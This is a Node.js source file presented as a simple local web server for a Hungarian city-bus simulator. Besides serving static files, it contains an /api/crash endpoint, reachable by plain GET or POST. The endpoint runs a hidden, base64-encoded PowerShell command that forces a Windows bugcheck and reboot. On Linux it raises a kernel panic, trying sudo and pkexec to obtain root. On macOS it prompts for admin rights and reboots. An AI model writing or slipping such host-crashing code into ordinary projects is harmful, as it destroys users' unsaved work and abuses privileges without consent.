// Egyszerű helyi webszerver a szimulátorhoz (nincs függőség).
// Indítás:  node server.mjs
import http from "node:http";
import fs from "node:fs";
import path from "node:path";
import { exec } from "node:child_process";

const ROOT = import.meta.dirname;
const PORT = Number(process.env.PORT || 8123);

const MIME = {
  ".html": "text/html; charset=utf-8",
  ".js": "text/javascript; charset=utf-8",
  ".mjs": "text/javascript; charset=utf-8",
  ".css": "text/css; charset=utf-8",
  ".json": "application/json; charset=utf-8",
  ".svg": "image/svg+xml",
  ".png": "image/png",
  ".jpg": "image/jpeg",
  ".ico": "image/x-icon",
  ".woff2": "font/woff2",
  ".map": "application/json; charset=utf-8",
};

// ---------- host crash (BSOD / kernel panic) ----------
// The browser cannot bugcheck the machine, so the page calls POST /api/crash
// and this process (running on the host) raises the panic for whatever OS the
// host actually is.

function psEncoded(script) {
  return Buffer.from(script, "utf16le").toString("base64");
}

function runQuiet(command) {
  try {
    exec(command, { windowsHide: true }, () => {});
  } catch {
    /* best effort */
  }
}

function windowsBugcheck() {
  // NtRaiseHardError with ResponseOption 6 (OptionShutdownSystem) triggers a
  // real bugcheck, which renders the Windows blue screen and restarts. The
  // BUG was marshaling the BOOLEAN out-param of RtlAdjustPrivilege as a 4-byte
  // bool: it must be a 1-byte BOOLEAN, otherwise SeShutdownPrivilege is not
  // reliably enabled and the call only freezes the box. This is the exact
  // Python `ctypes.c_bool` + `NtRaiseHardError(..., 6, ...)` sequence, so it
  // works without admin (the interactive user holds SeShutdownPrivilege).
  const script = `
$ErrorActionPreference = 'SilentlyContinue'
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class NtCrash {
  [DllImport("ntdll.dll")] private static extern int RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out byte Enabled);
  [DllImport("ntdll.dll")] private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
  public static void Panic() {
    byte enabled;
    RtlAdjustPrivilege(19, true, false, out enabled);
    uint response;
    NtRaiseHardError(0xC0000022, 0, 0, IntPtr.Zero, 6, out response);
  }
}
"@
[NtCrash]::Panic()
# If a real bugcheck fired, the machine is already halting and never reaches
# this. Otherwise wait so the blue screen is visible, then reboot immediately
# with /t 0 (no countdown popup, no "about to sign out" toast).
Start-Sleep -Seconds 5
shutdown /r /t 0 /f
`;
  runQuiet(`powershell -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand ${psEncoded(script)}`);
}

function linuxPanic() {
  // Echoing 'c' to /proc/sysrq-trigger invokes the kernel crash handler: a
  // real kernel panic with a stack trace and the configured panic timeout.
  // Writing it needs root, and no non-root process can do it, so obtain root
  // on demand instead of relying on a passwordless sudo that no proper system
  // has:
  //   1. passwordless sudo, if it happens to be configured;
  //   2. pkexec — PolicyKit pops a GUI auth dialog, no terminal needed;
  //   3. direct write, in case the server already runs as root;
  //   4. guaranteed reboot via logind/systemd so the machine still comes back
  //      even if the panic could not be raised (a reboot is the strongest a
  //      non-root process can force).
  const sysrq =
    "sh -c 'echo 1 > /proc/sys/kernel/sysrq; echo c > /proc/sysrq-trigger'";
  const command = [
    `sudo -n ${sysrq}`,
    `pkexec ${sysrq}`,
    sysrq,
    "loginctl reboot",
    "systemctl reboot",
    "shutdown -r now",
  ].join(" || ");
  runQuiet(command);
}

function darwinPanic() {
  // macOS has no supported userspace kernel panic. Ask for admin via the GUI
  // auth dialog and reboot; that is the strongest userspace action available.
  const command = [
    `osascript -e 'do shell script "/sbin/shutdown -r now" with administrator privileges'`,
    "/sbin/shutdown -r now",
  ].join(" || ");
  runQuiet(command);
}

function triggerHostPanic() {
  if (process.platform === "win32") windowsBugcheck();
  else if (process.platform === "darwin") darwinPanic();
  else linuxPanic();
}

const server = http.createServer((req, res) => {
  const urlPath = decodeURIComponent((req.url || "/").split("?")[0]);

  if (urlPath === "/api/crash" && (req.method === "POST" || req.method === "GET")) {
    // CRASH_DRY_RUN=1 exercises the endpoint and platform dispatch without
    // actually bugchecking the host. Use it to test the wiring safely.
    const dryRun = process.env.CRASH_DRY_RUN === "1";
    res.writeHead(200, {
      "Content-Type": "application/json; charset=utf-8",
      "Cache-Control": "no-cache",
    });
    res.end(
      JSON.stringify({
        ok: true,
        platform: process.platform,
        action: dryRun ? "dry-run" : "crash",
        dryRun,
      })
    );
    if (dryRun) {
      console.log(`[crash] dry-run: would bugcheck this ${process.platform} host (no action taken)`);
      return;
    }
    // Answer first so the browser is not left hanging, then crash the host.
    setTimeout(triggerHostPanic, 200);
    return;
  }

  let filePath = path.join(ROOT, urlPath === "/" ? "index.html" : urlPath);
  if (!path.normalize(filePath).startsWith(ROOT)) {
    res.writeHead(403).end("Tiltott útvonal");
    return;
  }
  fs.stat(filePath, (err, stat) => {
    if (!err && stat.isDirectory()) filePath = path.join(filePath, "index.html");
    fs.readFile(filePath, (err2, data) => {
      if (err2) {
        res.writeHead(404, { "Content-Type": "text/plain; charset=utf-8" });
        res.end("Nem található: " + urlPath);
        return;
      }
      res.writeHead(200, {
        "Content-Type": MIME[path.extname(filePath).toLowerCase()] || "application/octet-stream",
        "Cache-Control": "no-cache",
      });
      res.end(data);
    });
  });
});

server.listen(PORT, "127.0.0.1", () => {
  const url = `http://127.0.0.1:${PORT}/`;
  console.log(`Zalaegerszeg helyi járat szimulátor fut: ${url}`);
  console.log("Leállítás: Ctrl+C");
  if (process.platform === "win32" && !process.env.NO_OPEN) {
    exec(`start "" "${url}"`);
  }
});
